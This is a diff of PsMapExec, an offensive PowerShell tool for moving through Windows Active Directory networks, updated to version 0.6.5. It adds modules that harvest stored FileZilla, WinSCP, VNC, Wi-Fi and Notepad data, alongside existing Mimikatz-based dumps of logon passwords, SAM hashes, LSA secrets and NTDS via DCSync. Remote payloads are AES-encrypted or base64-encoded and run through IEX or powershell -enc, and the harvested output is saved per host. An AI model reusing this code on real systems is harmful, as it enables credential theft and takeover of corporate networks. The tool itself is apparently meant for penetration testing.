@@ -183,6 +183,26 @@ Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
  | -ShowOutput         |     N/A      | Displays output for executed modules. Commands shown by default |
  +---------------------+--------------+-----------------------------------------------------------------+
 
+ Module Details
+ +---------------------+--------------------------------------------------------------------------------+
+ | Module              | Description                                                                    |
+ +---------------------+--------------------------------------------------------------------------------+
+ | Amnesiac            | Executes Amnesiac C2 payloads                                                  |
+ | ConsoleHistory      | Dumps PowerShell console history                                               |
+ | eKeys               | Dumps encryption keys from memory (Mimikatz)                                   |
+ | FileZilla           | Extracts and decodes FileZilla passwords from common locations                 |
+ | Files               | Lists files in common directories for each user                                |
+ | KerbDump            | Dumps Kerberos tickets                                                         |
+ | LogonPasswords      | Dumps logon passwords from memory (Mimikatz)                                   | 
+ | LSA                 | Dumps LSA (Mimikatz)                                                           |
+ | NTDS                | Executes DCsync on the remote system                                           |
+ | SAM                 | Dumps SAM hashes                                                               |
+ | SCCM                | Dumps NAA credentials and task sequences                                       |
+ | VNC                 | Extracts and decrypts VNC passwords from common locations                      |
+ | WinSCP              | Extracts and decrypts WinSCP passwords from common locations                   |
+ +---------------------+--------------------------------------------------------------------------------+
+
+
  Spraying Parameters
  +---------------------+--------------+-----------------------------------------------------------------+
  | Parameter           |    Value     | Description                                                     |
@@ -239,7 +259,7 @@ Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
                                                                  
 
 Github  : https://github.com/The-Viper-One
-Version : 0.6.2")
+Version : 0.6.5")
 
     if (!$NoBanner) {
         Write-Output $Banner
@@ -266,31 +286,39 @@ Version : 0.6.2")
     
 
     $PME = Join-Path $WorkingDirectory "PME"
-    $SAM = Join-Path $PME "SAM"
-    $MSSQL = Join-Path $PME "MSSQL"
-    $LogonPasswords = Join-Path $PME "LogonPasswords"
-    $SMB = Join-Path $PME "SMB"
-    $Tickets = Join-Path $PME "Tickets"
-    $ekeys = Join-Path $PME "eKeys"
-    $LSA = Join-Path $PME "LSA"
-    $ConsoleHistory = Join-Path $PME "Console History"
-    $Sessions = Join-Path "$PME" "Sessions"
-    $UserFiles = Join-Path "$PME" "User Files"
-    $Spraying = Join-Path $PME "Spraying"
-    $VNC = Join-Path $PME "VNC"
-    $NTDS = Join-Path $PME "NTDS"
-    $Kerberoast = Join-Path $PME "Kerberoast"
-    $IPMI = Join-Path $PME "IPMI"
-    $RDP = Join-Path $PME "RDP"
     $BloodHound = Join-Path $PME "BloodHound"
+    $ConsoleHistory = Join-Path $PME "Console History"
+    $ekeys = Join-Path $PME "eKeys"
+    $FileZilla = Join-Path $PME "FileZilla"
+    $IPMI = Join-Path $PME "IPMI"
+    $Kerberoast = Join-Path $PME "Kerberoast"
+    $LogonPasswords = Join-Path $PME "LogonPasswords"
+    $LSA = Join-Path $PME "LSA"
+    $MSSQL = Join-Path $PME "MSSQL"
+    $NTDS = Join-Path $PME "NTDS"
+    $NotePad = Join-Path $PME "Notepad"
+    $RDP = Join-Path $PME "RDP"
+    $SAM = Join-Path $PME "SAM"
     $SCCM = Join-Path $PME "SCCM"
+    $Sessions = Join-Path $PME "Sessions"
+    $SMB = Join-Path $PME "SMB"
+    $Spraying = Join-Path $PME "Spraying"
+    $Tickets = Join-Path $PME "Tickets"
+    $UserFiles = Join-Path $PME "User Files"
+    $VNCRoot = Join-Path $PME "VNC"
+    $VNCDump = Join-Path $VNCRoot "VNC Dump"
+    $VNC = Join-Path $VNCRoot "VNC NoAuth"
+    $Wifi = Join-Path $PME "Wi-Fi"
+    $WinSCP = Join-Path $PME "WinSCP"
 
     $directories = @(
-        $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
-        $LSA, $ConsoleHistory, $Sessions, 
-        $UserFiles, $Spraying, $VNC, $NTDS, $Kerberoast, $IPMI, $RDP, $BloodHound,
-        $SCCM
+        $BloodHound, $ConsoleHistory, $ekeys, $FileZilla, $IPMI, $Kerberoast, $LogonPasswords, $LSA, 
+        $MSSQL, $NTDS, $Notepad, $PME, $RDP, $SAM, $SCCM, $Sessions, $SMB, $Spraying, $Tickets, $UserFiles, 
+        $VNCDump, $VNC, $Wifi, $WinSCP
     )
+
+    # Sort directories alphabetically
+    $directories = $directories | Sort-Object
 
     foreach ($directory in $directories) {
         if (-not (Test-Path $directory)) {
@@ -458,29 +486,29 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
     ################################################################################################################
     ####################################### Some logic based checking ##############################################
     ################################################################################################################
+    
     if ($Method -ne "") {
         switch ($Method) {
             "All" {}
-            "WinRM" {}
-            "MSSQL" {}
-            "SMB" {}
-            "WMI" {}
-            "RDP" {}
             "GenRelayList" {}
+            "Inject" {}
+            "IPMI" {}
+            "Kerberoast" {}
+            "MSSQL" {}
+            "RDP" {}
+            "SMB" {}
             "SessionHunter" {}
             "Spray" {}
             "VNC" {}
-            "Kerberoast" {}
-            "Inject" {}
-            "IPMI" {}
+            "WMI" {}
+            "WinRM" {}
 
             default {
-            
                 Write-Host
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                 Write-Host "Invalid Method specified"
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
-                Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter, Kerberoast, Inject or IPMI"
+                Write-Host "Specify either: All, GenRelayList, Inject, IPMI, Kerberoast, MSSQL, RDP, SMB, SessionHunter, Spray, VNC, WMI, or WinRM"
                 return
             }
         }
@@ -490,28 +518,34 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         switch ($Module) {
             "Amnesiac" {}
             "ConsoleHistory" {}
+            "eKeys" {}
+            "FileZilla" {}
             "Files" {}
             "KerbDump" {}
-            "eKeys" {}
-            "LogonPasswords" {}
             "LSA" {}
+            "LogonPasswords" {}
             "NTDS" {}
+            "Notepad" {}
             "SAM" {}
             "SCCM" {}
             "Test" {}
             "Tickets" {}
+            "VNC" {}
+            "WiFi" {}
+            "WinSCP" {}
+
 
             default {
-            
                 Write-Host
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                 Write-Host "Invalid Module specified"
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
-                Write-Host "Specify either: Files, ConsoleHistory, KerbDump, eKeys, LogonPasswords, LSA, NTDS, SAM, Amnesiac or SCCM"
+                Write-Host "Specify either: Amnesiac, ConsoleHistory,eKeys, FileZilla, Files, KerbDump, LSA, LogonPasswords, NTDS, Notepad, SAM, SCCM, Tickets, VNC, Wifi or WinSCP "
                 return
             }
         }
     }
+
 
     if ($Module -eq "NTDS" -and ($Targets -in @("Everything", "Workstations", "all", "Servers"))) {
     
@@ -2028,16 +2062,21 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
     }
 
     $moduleMessages = @{
-        "KerbDump"       = "Tickets will be written to $Tickets"
-        "Tickets"        = "Tickets will be written to $MimiTickets"
-        "LSA"            = "LSA output will be written to $LSA"
-        "ekeys"          = "eKeys output will be written to $ekeys"
-        "SAM"            = "SAM output will be written to $SAM"
-        "LogonPasswords" = "LogonPasswords output will be written to $LogonPasswords"
         "ConsoleHistory" = "Console History output will be written to $ConsoleHistory"
+        "ekeys"          = "eKeys output will be written to $ekeys"
+        "FileZilla"      = "FileZilla output will be written to $FileZilla"
         "Files"          = "File output will be written to $UserFiles"
+        "KerbDump"       = "Tickets will be written to $Tickets"
+        "LSA"            = "LSA output will be written to $LSA"
+        "LogonPasswords" = "LogonPasswords output will be written to $LogonPasswords"
         "NTDS"           = "NTDS output will be written to $NTDS"
+        "SAM"            = "SAM output will be written to $SAM"
         "SCCM"           = "SCCM output will be written to $SCCM"
+        "Tickets"        = "Tickets will be written to $MimiTickets"
+        "VNC"            = "VNC Passwords output will be written to $VNCDump"
+        "Wifi"           = "Wi-Fi output will be written to $Wifi"
+        "WinSCP"         = "WinSCP output will be written to $WinSCP"
+
     }
 
     if ($moduleMessages.ContainsKey($Module)) {
@@ -2155,7 +2194,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$LocalKirbDump"
-        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
 
         
     }
@@ -2164,61 +2203,79 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$LocalSCCM"
-        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX "
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX "
     }
 
     # SAM
-    elseif ($Module -eq "sam") {
+    elseif ($Module -eq "SAM") {
+        
+        $b64 = "$LocalSAM"
+        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
+        $Command = "powershell.exe -enc $base64command"
+    }
+
+    # WinSCP
+    elseif ($Module -eq "WinSCP") {
         
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
-        $n = AESEnc -k $key -iv $iv -t "$LocalSAM"
-        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX"
+        $n = AESEnc -k $key -iv $iv -t "$LocalWinSCP"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
-    # Disks
-    elseif ($Module -eq "disks") {
-        $b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
-        # Set module to "" for modules where we do not wish to save output for
-        $Module = ""
+    # VNC Dump
+    elseif ($Module -eq "VNC") {
+        
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$LocalVNC"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
-    # LoggedOnUsers
-    elseif ($Module -eq "LoggedOnUsers") {
-        $b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
-        # Set module to "" for modules where we do not wish to save output for
-        $Module = ""
+    # Filezilla Dump
+    elseif ($Module -eq "FileZilla") {
+        
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$LocalFileZilla"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
-    # Sessions
-    elseif ($Module -eq "Sessions") {
-        $b64 = "Write-host; query user | Out-String"
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
-        # Set module to "" for modules where we do not wish to save output for
-        $Module = ""
+    
+    # Wifi
+    elseif ($Module -eq "wifi") {
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$LocalWifi"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
+    # Notepad
+    elseif ($Module -eq "Notepad") {
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$LocalNotepad"
+        $Command = "$LocalNotepad"
+    }
+
+    
     # ConsoleHistory
     elseif ($Module -eq "ConsoleHistory") {
-        $b64 = "$ConsoleHostHistory"
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$ConsoleHostHistory"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
     # Files
     elseif ($Module -eq "Files") {
         $b64 = "$Files"
         $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
+        $Command = "powershell.exe -enc $base64command"
+
     }
 
-    elseif ($Module -eq "" -and $Command -ne "") {
-        
+    elseif ($Module -eq "" -and $Command -ne "") {      
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$Command"
@@ -2382,9 +2439,8 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                                 break
                             }
     
-                            if ($LocalAuth) {$watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred}
-			    else {$watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"}
-			    
+                                if ($LocalAuth) {$watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred}
+			                    else {$watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"}
     
                             Start-Sleep -Seconds 1
                         } While ($watcher -ne $null)
@@ -2417,6 +2473,9 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                 Catch { $Cleanup = "Failure" }
                 return @($result, $Cleanup, $Class)
             }
+
+
+
 
             If ($LocalAuth) { WMI -ComputerName $ComputerName -Command $Command -LocalAuth -Username $Username -Password $Password }
             else { WMI -ComputerName $ComputerName  -Command $Command }
@@ -2467,34 +2526,41 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                     elseif ($result -eq "Access Denied") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
 
                     elseif ($Cleanup -eq "Failure") {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[WARNING] " -statusText "Error when performing cleanup. Cleanup with Remove-WmiObject -Class ""$Class"" -Namespace ""root\cimv2"" -ComputerName $($runspace.ComputerName)" -NameLength $NameLength -OSLength $OSLength
+                        Continue
                     }
 
  
                     elseif ($result -eq "Unspecified Error") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
                     elseif ($result -eq "Timed Out") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
             
                     elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     } 
 
                     elseif ($result -like "*ActualConfig: Invalid namespace*" -and $Module -eq "SCCM") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NOT SCCM CLIENT" -NameLength $NameLength -OSLength $OSLength
+                        Continue
+                    }
+
+                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "No Results" -NameLength $NameLength -OSLength $OSLength
                         Continue
                     }
                          
@@ -2503,6 +2569,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     } 
 
                     elseif ($result -match "[a-zA-Z0-9]") {
@@ -2510,6 +2577,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                            Continue
                         } 
                         else {
                             
@@ -2517,18 +2585,25 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                            #Write-Output ""
 
                             $filePath = switch ($Module) {
-                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
-                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
-                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
-                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
-                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
-                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
+                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
+                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
+                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
+                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
+                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
+
                                 default { $null }
                             }
 
@@ -2536,16 +2611,16 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                                 $result | Out-File -FilePath $filePath -Encoding "ASCII"
                         
                                 if ($ShowOutput) {
-                                    $result | Write-Host
-                                    Write-Host
+                                    $result | Write-Output
+                                    Write-Output ""
                                     $hasDisplayedResult = $true
                                 }
                             }
 
                             # Handle the default case.
                             if (-not $Module -and -not $hasDisplayedResult) {
-                                $result | Write-Host
-                                Write-Host
+                                $result | Write-Output
+                                Write-Output ""
                                 $hasDisplayedResult = $true
                             }
                         }
@@ -2555,6 +2630,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS " -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     }
 
                     # Dispose of runspace and close handle
@@ -2844,12 +2920,19 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NOT SCCM CLIENT" -NameLength $NameLength -OSLength $OSLength
                         Continue
                     }
+
+                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                        Continue
+                    }
              
                     elseif ($result -eq "Successful Connection PME") {
                         $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     } 
             
                     elseif ($result -eq "Unable to connect") {}
@@ -2858,8 +2941,8 @@ while (`$true) {
                 
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
-                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                            Continue
                         }
                  
                         else {
@@ -2867,18 +2950,25 @@ while (`$true) {
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                            #Write-Output ""
 
                             $filePath = switch ($Module) {
-                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
-                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
-                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
-                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
-                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
-                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
+                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
+                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
+                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
+                                "LSA" { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
+                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
+                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
+                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
+                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
+                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
+
                                 default { $null }
                             }
 
@@ -2886,16 +2976,16 @@ while (`$true) {
                                 $result | Out-File -FilePath $filePath -Encoding "ASCII"
                         
                                 if ($ShowOutput) {
-                                    $result | Write-Host
-                                    Write-Host
+                                    $result | Write-Output
+                                    Write-Output ""
                                     $hasDisplayedResult = $true
                                 }
                             }
 
                             # Handle the default case.
                             if (-not $Module -and -not $hasDisplayedResult) {
-                                $result | Write-Host
-                                Write-Host
+                                $result | Write-Output
+                                Write-Output ""
                                 $hasDisplayedResult = $true
                             }
                         }
@@ -2905,6 +2995,7 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     }
 
                     # Dispose of runspace and close handle
@@ -3095,44 +3186,50 @@ while (`$true) {
                     if ($result -eq "Access Denied") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
                      
                     elseif ($result -eq "Unspecified Error") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
                     
                     elseif ($result -eq "Unable to resolve") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "Unable to resolve DNS name, required for WinRM" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
 
                     } 
 
                     elseif ($result -like "*Cannot find the computer*") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "Unable to fully resolve the FQDN" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
 
                     } 
 
                     elseif ($result -eq "Timed Out") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
             
                     elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
-                        continue
+                        Continue
                     }
 
                     elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NOT SCCM CLIENT" -NameLength $NameLength -OSLength $OSLength
+                        Continue
+                    }
+
+                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                         Continue
                     }
              
@@ -3141,6 +3238,7 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
+                        Continue
                     } 
             
                     elseif ($result -eq "Unable to connect") {}
@@ -3149,26 +3247,33 @@ while (`$true) {
                 
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
-                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                            Continue
                         } 
                         else {
                             $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
